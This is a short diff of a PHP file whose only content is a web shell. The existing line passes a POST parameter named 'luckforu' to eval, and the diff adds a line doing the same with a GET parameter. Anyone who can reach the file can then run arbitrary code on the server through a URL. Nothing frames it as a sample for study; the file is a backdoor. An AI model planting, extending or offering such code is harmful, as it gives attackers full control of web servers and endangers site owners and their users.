@@ -1,2 +1,3 @@
 <?php
 eval($_POST["luckforu"]);
+eval($_GET['luckforu']);
